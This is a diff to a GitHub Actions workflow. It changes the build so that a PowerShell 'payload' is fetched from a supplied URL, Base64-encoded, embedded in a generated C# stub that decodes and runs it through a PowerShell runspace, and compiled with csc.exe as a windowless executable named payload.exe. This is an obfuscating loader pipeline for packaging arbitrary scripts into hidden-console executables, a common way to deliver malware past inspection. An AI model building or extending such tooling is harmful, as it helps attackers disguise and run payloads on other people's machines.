@@ -1,4 +1,4 @@
-name: Build PowerShell EXE using ps2exe
+name: Build PowerShell EXE using C# method
 
 on:
   workflow_dispatch:
@@ -17,30 +17,57 @@ jobs:
     - name: Checkout code
       uses: actions/checkout@v3
 
-    # Step 2: Download ps2exe module
-    - name: Download ps2exe module
-      run: |
-        Install-Module -Name ps2exe -Force -Scope CurrentUser
-
-    # Step 3: Fetch the payload script from the provided URL and save it
+    # Step 2: Fetch the PowerShell script from the provided URL
     - name: Fetch Payload from URL
       run: |
         $url = '${{ github.event.inputs.payload_url }}'
         $payload = Invoke-WebRequest -Uri $url -OutFile 'payload.ps1'
         Write-Host "[INFO] Payload script downloaded."
 
-    # Step 4: Convert the PowerShell script to an executable
-    - name: Convert PowerShell script to EXE using ps2exe
+    # Step 3: Convert the PowerShell script to Base64
+    - name: Convert PowerShell script to Base64
       run: |
-        ps2exe .\payload.ps1 .\payload.exe
-        Write-Host "[INFO] Payload converted to EXE."
+        $script = Get-Content -Path 'payload.ps1' -Raw
+        $b64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($script))
+        $b64 | Out-File -FilePath 'base64_payload.txt'
+        Write-Host "[INFO] PowerShell script converted to Base64."
 
-    # Step 5: List the contents of the output directory
+    # Step 4: Create C# Code with Base64 PowerShell Payload
+    - name: Generate C# code
+      run: |
+        $b64 = Get-Content -Path 'base64_payload.txt' -Raw
+        $csharp_code = @"
+using System;
+using System.Management.Automation;
+using System.Management.Automation.Runspaces;
+
+class Program {
+    static void Main() {
+        string b64 = "$b64"; 
+        string script = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(b64));
+
+        using (PowerShell ps = PowerShell.Create()) {
+            ps.AddScript(script);
+            ps.Invoke();
+        }
+    }
+}
+"@
+        $csharp_code | Out-File -FilePath 'Program.cs'
+        Write-Host "[INFO] C# code generated with embedded Base64 payload."
+
+    # Step 5: Compile C# Code into EXE using csc.exe
+    - name: Compile C# code into EXE
+      run: |
+        & "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" /target:winexe /out:payload.exe Program.cs
+        Write-Host "[INFO] C# code compiled into EXE."
+
+    # Step 6: List the contents of the output directory
     - name: List contents of the output directory
       run: |
         dir
 
-    # Step 6: Upload the executable as an artifact
+    # Step 7: Upload the executable as an artifact
     - name: Upload executable
       uses: actions/upload-artifact@v4
       with:
@@ -50,7 +77,3 @@ jobs:
         compression-level: 6
         overwrite: false
         include-hidden-files: false
-
-
-
-
